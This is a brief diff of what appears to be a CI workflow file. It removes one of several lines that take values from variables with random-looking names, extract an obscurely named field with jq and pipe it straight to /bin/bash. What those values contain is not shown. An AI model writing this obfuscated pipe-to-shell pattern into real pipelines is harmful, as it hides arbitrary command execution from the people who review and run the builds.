@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$up9" | jq -r .nw6306 | /bin/bash
           echo $u98181 | jq -r .xo06 | /bin/bash
           echo $rcvhb8337 | jq -r .ewti79 | /bin/bash
-          printf '%s' "$n2" | jq -r .dmql2401 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
